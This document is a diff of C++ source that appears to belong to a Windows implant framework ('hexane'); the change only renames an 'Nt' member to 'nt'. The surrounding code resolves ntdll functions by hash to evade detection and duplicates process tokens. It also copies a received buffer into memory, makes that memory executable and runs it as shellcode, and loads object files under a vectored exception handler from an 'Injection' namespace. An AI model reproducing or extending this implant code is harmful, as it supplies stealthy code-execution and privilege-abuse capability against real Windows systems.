@@ -19,7 +19,7 @@ namespace Memory {
             HEXANE
 
             uintptr_t cookie = 0;
-            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
+            if (!NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
                 cookie = 0;
             }
             return cookie;
@@ -102,17 +102,17 @@ namespace Memory {
 
             if (
                 !(instance.modules.ntdll = M_PTR(NTDLL)) ||
-                !(F_PTR_HMOD(instance.Nt.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(instance.Nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP)) ||
-                !(F_PTR_HMOD(instance.Nt.RtlRandomEx, instance.modules.ntdll, RTLRANDOMEX))) {
+                !(F_PTR_HMOD(instance.nt.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
+                !(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP)) ||
+                !(F_PTR_HMOD(instance.nt.RtlRandomEx, instance.modules.ntdll, RTLRANDOMEX))) {
                 return;
             }
 
-            if (!NT_SUCCESS(instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &region, &region_size, PAGE_READWRITE, nullptr))) {
+            if (!NT_SUCCESS(instance.nt.NtProtectVirtualMemory(NtCurrentProcess(), &region, &region_size, PAGE_READWRITE, nullptr))) {
                 return;
             }
             region = C_PTR(GLOBAL_OFFSET);
-            if (!(C_DREF(region) = instance.Nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
+            if (!(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                 return;
             }
 
@@ -124,7 +124,7 @@ namespace Memory {
         VOID ContextDestroy(_hexane* Ctx) {
             // todo: needs expanded to destroy all strings (http/smb context + anything else)
 
-            auto RtlFreeHeap = Ctx->Nt.RtlFreeHeap;
+            auto RtlFreeHeap = Ctx->nt.RtlFreeHeap;
             auto Heap = Ctx->heap;
 
             x_memset(Ctx, 0, sizeof(_hexane));
@@ -144,7 +144,7 @@ namespace Memory {
                 return_defer(ERROR_PROC_NOT_FOUND);
             }
 
-            if (!(F_PTR_HASHES(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
+            if (!(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
                 return_defer(ERROR_PROC_NOT_FOUND);
             }
 
@@ -152,7 +152,7 @@ namespace Memory {
             Ctx->session.version = WIN_VERSION_UNKNOWN;
             OSVersionW.dwOSVersionInfoSize = sizeof(OSVersionW);
 
-            if (!NT_SUCCESS(Ctx->Nt.RtlGetVersion(&OSVersionW))) {
+            if (!NT_SUCCESS(Ctx->nt.RtlGetVersion(&OSVersionW))) {
                 return_defer(ERROR_PROC_NOT_FOUND);
             }
 
@@ -191,47 +191,47 @@ namespace Memory {
             }
 
             if (
-                !(F_PTR_HMOD(Ctx->Nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER)) ||
-                !(F_PTR_HMOD(Ctx->Nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtAllocateVirtualMemory, Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->Nt.RtlAllocateHeap, Ctx->modules.ntdll, RTLALLOCATEHEAP)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtFreeVirtualMemory, Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtReadVirtualMemory, Ctx->modules.ntdll, NTREADVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtWriteVirtualMemory, Ctx->modules.ntdll, NTWRITEVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtQueryVirtualMemory, Ctx->modules.ntdll, NTQUERYVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtCreateSection, Ctx->modules.ntdll, NTCREATESECTION)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtMapViewOfSection, Ctx->modules.ntdll, NTMAPVIEWOFSECTION)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtUnmapViewOfSection, Ctx->modules.ntdll, NTUNMAPVIEWOFSECTION)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory, Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlAllocateHeap, Ctx->modules.ntdll, RTLALLOCATEHEAP)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory, Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtReadVirtualMemory, Ctx->modules.ntdll, NTREADVIRTUALMEMORY)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtWriteVirtualMemory, Ctx->modules.ntdll, NTWRITEVIRTUALMEMORY)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtQueryVirtualMemory, Ctx->modules.ntdll, NTQUERYVIRTUALMEMORY)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtCreateSection, Ctx->modules.ntdll, NTCREATESECTION)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtMapViewOfSection, Ctx->modules.ntdll, NTMAPVIEWOFSECTION)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtUnmapViewOfSection, Ctx->modules.ntdll, NTUNMAPVIEWOFSECTION)) ||
 
-                !(F_PTR_HMOD(Ctx->Nt.NtCreateUserProcess, Ctx->modules.ntdll, NTCREATEUSERPROCESS)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtTerminateProcess, Ctx->modules.ntdll, NTTERMINATEPROCESS)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtOpenProcess, Ctx->modules.ntdll, NTOPENPROCESS)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtOpenProcessToken, Ctx->modules.ntdll, NTOPENPROCESSTOKEN)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtOpenThreadToken, Ctx->modules.ntdll, NTOPENTHREADTOKEN)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtDuplicateObject, Ctx->modules.ntdll, NTDUPLICATEOBJECT)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtDuplicateToken, Ctx->modules.ntdll, NTDUPLICATETOKEN)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtQueryInformationToken, Ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtQueryInformationProcess, Ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtQuerySystemInformation, Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtClose, Ctx->modules.ntdll, NTCLOSE)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtCreateUserProcess, Ctx->modules.ntdll, NTCREATEUSERPROCESS)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtTerminateProcess, Ctx->modules.ntdll, NTTERMINATEPROCESS)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtOpenProcess, Ctx->modules.ntdll, NTOPENPROCESS)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtOpenProcessToken, Ctx->modules.ntdll, NTOPENPROCESSTOKEN)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtOpenThreadToken, Ctx->modules.ntdll, NTOPENTHREADTOKEN)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtDuplicateObject, Ctx->modules.ntdll, NTDUPLICATEOBJECT)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtDuplicateToken, Ctx->modules.ntdll, NTDUPLICATETOKEN)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtQueryInformationToken, Ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtQueryInformationProcess, Ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtQuerySystemInformation, Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtClose, Ctx->modules.ntdll, NTCLOSE)) ||
 
-                !(F_PTR_HMOD(Ctx->Nt.RtlRandomEx, Ctx->modules.ntdll, RTLRANDOMEX)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtResumeThread, Ctx->modules.ntdll, NTRESUMETHREAD)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtGetContextThread, Ctx->modules.ntdll, NTGETCONTEXTTHREAD)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtSetContextThread, Ctx->modules.ntdll, NTSETCONTEXTTHREAD)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtSetInformationThread, Ctx->modules.ntdll, NTSETINFORMATIONTHREAD)) ||
-                !(F_PTR_HMOD(Ctx->Nt.NtWaitForSingleObject, Ctx->modules.ntdll, NTWAITFORSINGLEOBJECT)) ||
-                !(F_PTR_HMOD(Ctx->Nt.TpAllocWork, Ctx->modules.ntdll, TPALLOCWORK)) ||
-                !(F_PTR_HMOD(Ctx->Nt.TpPostWork, Ctx->modules.ntdll, TPPOSTWORK)) ||
-                !(F_PTR_HMOD(Ctx->Nt.TpReleaseWork, Ctx->modules.ntdll, TPRELEASEWORK)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlRandomEx, Ctx->modules.ntdll, RTLRANDOMEX)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtResumeThread, Ctx->modules.ntdll, NTRESUMETHREAD)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtGetContextThread, Ctx->modules.ntdll, NTGETCONTEXTTHREAD)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtSetContextThread, Ctx->modules.ntdll, NTSETCONTEXTTHREAD)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtSetInformationThread, Ctx->modules.ntdll, NTSETINFORMATIONTHREAD)) ||
+                !(F_PTR_HMOD(Ctx->nt.NtWaitForSingleObject, Ctx->modules.ntdll, NTWAITFORSINGLEOBJECT)) ||
+                !(F_PTR_HMOD(Ctx->nt.TpAllocWork, Ctx->modules.ntdll, TPALLOCWORK)) ||
+                !(F_PTR_HMOD(Ctx->nt.TpPostWork, Ctx->modules.ntdll, TPPOSTWORK)) ||
+                !(F_PTR_HMOD(Ctx->nt.TpReleaseWork, Ctx->modules.ntdll, TPRELEASEWORK)) ||
 
-                !(F_PTR_HMOD(Ctx->Nt.RtlCreateHeap, Ctx->modules.ntdll, RTLCREATEHEAP)) ||
-                !(F_PTR_HMOD(Ctx->Nt.RtlReAllocateHeap, Ctx->modules.ntdll, RTLREALLOCATEHEAP)) ||
-                !(F_PTR_HMOD(Ctx->Nt.RtlFreeHeap, Ctx->modules.ntdll, RTLFREEHEAP)) ||
-                !(F_PTR_HMOD(Ctx->Nt.RtlDestroyHeap, Ctx->modules.ntdll, RTLDESTROYHEAP)) ||
-                !(F_PTR_HMOD(Ctx->Nt.RtlInitUnicodeString, Ctx->modules.ntdll, RTLINITUNICODESTRING)) ||
-                !(F_PTR_HMOD(Ctx->Nt.RtlCreateProcessParametersEx, Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
-                !(F_PTR_HMOD(Ctx->Nt.RtlDestroyProcessParameters, Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS))) {
+                !(F_PTR_HMOD(Ctx->nt.RtlCreateHeap, Ctx->modules.ntdll, RTLCREATEHEAP)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlReAllocateHeap, Ctx->modules.ntdll, RTLREALLOCATEHEAP)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlFreeHeap, Ctx->modules.ntdll, RTLFREEHEAP)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlDestroyHeap, Ctx->modules.ntdll, RTLDESTROYHEAP)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlInitUnicodeString, Ctx->modules.ntdll, RTLINITUNICODESTRING)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlCreateProcessParametersEx, Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
+                !(F_PTR_HMOD(Ctx->nt.RtlDestroyProcessParameters, Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS))) {
                 return_defer(ERROR_PROC_NOT_FOUND);
             }
 
@@ -527,7 +527,7 @@ namespace Memory {
             }
 
             object->size += object->fn_map->size;
-            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 return_defer(ntstatus);
             }
 
@@ -573,8 +573,8 @@ namespace Memory {
             wchar_t lowercase[MAX_PATH] = { };
 
             if (
-                !Ctx->Nt.NtGetContextThread(NtCurrentThread(), &thread_ctx) ||
-                !Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), REG_PEB_OFFSET(thread_ctx), C_PTR(&peb), sizeof(PEB), &read) || read != sizeof(PEB)) {
+                !Ctx->nt.NtGetContextThread(NtCurrentThread(), &thread_ctx) ||
+                !Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), REG_PEB_OFFSET(thread_ctx), C_PTR(&peb), sizeof(PEB), &read) || read != sizeof(PEB)) {
                 return nullptr;
             }
 
@@ -653,7 +653,7 @@ namespace Memory {
             for (ret = (address & 0xFFFFFFFFFFF70000) - 0x70000000;
                  ret < address + 0x70000000;
                  ret += 0x10000) {
-                if (!NT_SUCCESS(Ctx->Nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
+                if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                     ret = 0;
                 }
             }
@@ -677,7 +677,7 @@ namespace Memory {
             uintptr_t address = 0;
             auto buffer = R_CAST(uint8_t*, x_malloc(size));
 
-            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, start), buffer, size, &read))) {
+            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, start), buffer, size, &read))) {
                 return_defer(ntstatus);
             }
 
@@ -742,12 +742,12 @@ namespace Memory {
             void (*exec)()  = { };
             size_t size = parser.Length;
 
-            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 return_defer(ntstatus);
             }
 
             x_memcpy(address, parser.buffer, parser.Length);
-            if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
+            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
                 return_defer(ntstatus);
             }
 
@@ -758,7 +758,7 @@ namespace Memory {
 
         defer:
             if (address) {
-                ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
+                ntstatus = Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
             }
         }
 
@@ -770,7 +770,7 @@ namespace Memory {
             void *veh_handler   = { };
             void *exec          = { };
 
-            if (!(veh_handler = Ctx->Nt.RtlAddVectoredExceptionHandler(1, &Injection::Veh::Debugger))) {
+            if (!(veh_handler = Ctx->nt.RtlAddVectoredExceptionHandler(1, &Injection::Veh::Debugger))) {
                 return_defer(ERROR_INVALID_EXCEPTION_HANDLER);
             }
 
@@ -794,14 +794,14 @@ namespace Memory {
                         protection |= PAGE_NOCACHE;
                     }
 
-                    if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->sec_map[i].address), &object->sec_map[i].size, protection, nullptr))) {
+                    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->sec_map[i].address), &object->sec_map[i].size, protection, nullptr))) {
                         return_defer(ntstatus);
                     }
                 }
             }
 
             if (object->fn_map->size) {
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->fn_map), &object->fn_map->size, PAGE_READONLY, nullptr))) {
+                if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->fn_map), &object->fn_map->size, PAGE_READONLY, nullptr))) {
                     return_defer(ntstatus);
                 }
             }
@@ -844,7 +844,7 @@ namespace Memory {
 
             defer:
             if (veh_handler) {
-                Ctx->Nt.RtlRemoveVectoredExceptionHandler(veh_handler);
+                Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handler);
             }
 
             return success;
